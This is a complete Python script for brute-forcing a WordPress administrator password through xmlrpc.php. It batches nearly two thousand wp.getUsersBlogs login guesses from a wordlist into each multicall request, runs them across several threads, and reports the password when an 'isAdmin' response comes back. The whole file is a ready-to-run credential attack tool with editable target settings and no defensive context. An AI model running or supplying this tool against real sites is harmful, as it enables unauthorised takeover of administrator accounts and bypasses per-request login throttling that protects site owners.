#!/usr/bin/env python3

import re
import os
import sys
import time
import timeit
import threading
import queue
import signal
import xmlrpc.client
from itertools import islice

# Alter these
WORDPRESS_SERVER = 'http://192.168.99.100:32775/xmlrpc.php'
USERNAME = 'admin'
WORDLIST = '/tmp/wordlist.txt'
CHUNK_SIZE = 1998 # The number 1998 has been empirically established
THREADS_NUM = 5
# End alterations

print("[+] Started at {}".format(time.ctime()))
tried = 0
calls = 0
password_found = False

def signal_handler(signal_, *kwargs):
	""" Detect some interrupts

	Just a simple handler for various interrupts """

	print("[+] Finished at {}".format(time.ctime()))

	if signal_ == signal.SIGALRM:
		print("Password found. All done. Bye")
	else:
		print("Interrupted. Bye.")

	os.kill(os.getpid(), signal.SIGKILL)
	sys.exit(0)


def reader(qQueue):
	""" Load up chunks of the wordlist
		into the queue in order to populate an XML-RPC
		multi-call request """

	chunk = list(islice(fp, CHUNK_SIZE))

	while chunk:
		# Get CHUNK_SIZE records from the wordlist
		if password_found:
			#@debug
			print("[i] Leaving thread - nothing to do")
			return

		#@debug
		#print("[+] Putting ", chunk, " into the queue")
		qQueue.put(chunk)
		chunk = list(islice(fp, CHUNK_SIZE))


def requester(tried, calls, qQueue, password_found):
	""" Populate the XML-RPC request with maximum no.
		of subrequests and then fire it. """

	proxy = xmlrpc.client.ServerProxy(WORDPRESS_SERVER)

	while not password_found:
		chunk = qQueue.get()
		multicall = xmlrpc.client.MultiCall(proxy)

		for password in chunk:
			# Can be any other available method that needs auth.
			multicall.wp.getUsersBlogs(USERNAME, password.strip())
			tried += 1
			#@debug
			#print("[+]", threading.current_thread().name, "says: ",
			#	  "Adding {} to the multi-call".format(password.strip()))

		try:
			#@debug
			#print("[d] Making call with ", chunk)
			res = multicall()
		except:
			print("[x] Couldn't make an XML-RPC call. Bad connection?")

			#@debug
			print("[i] Was processing these passwords: ", chunk)

			return False

		calls += 1

		#@debug
		print("[i]", threading.current_thread().name, "Total words: ", tried, "Total calls: ", calls)

		if re.search("isAdmin", str(res.results), re.MULTILINE):
			# This is incorrectly getting a password that has been used
			# after the correct one was found. The passwords are in the same
			# batch so we need to grep the response well to find the right pass
			#print(str(res.results))

			i = 0
			for item in res.results:
				if re.search(r"'isAdmin': True", str(item)):
					print("[!] Found a match: \"{0}:{1}\""
						.format(USERNAME, chunk[i].strip()))

					password_found = True
					os.kill(os.getpid(), signal.SIGALRM)
				i+=1

		qQueue.task_done()

# Register interrupts for CTRL+C/Break and
# the end of work alarm
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGALRM, signal_handler)
q = queue.Queue()

#@debug
# can see system.multicall
#print(proxy.system.listMethods())

# Open the wordlist in latin-1
try:
	fp = open(WORDLIST, encoding="latin-1")
except:
	print("[!] Doh! Couldn't open the wordlist file.")
	exit(-1)

# Read the wordlist into the queue
reader(q)

# Run a few threads on the network requester
for i in range(THREADS_NUM):
	t = threading.Thread(target=requester, args=(tried, calls, q, password_found))
	t.daemon = True
	t.start()

q.join()
print("[+] Finished at {}".format(time.ctime()))
fp.close()
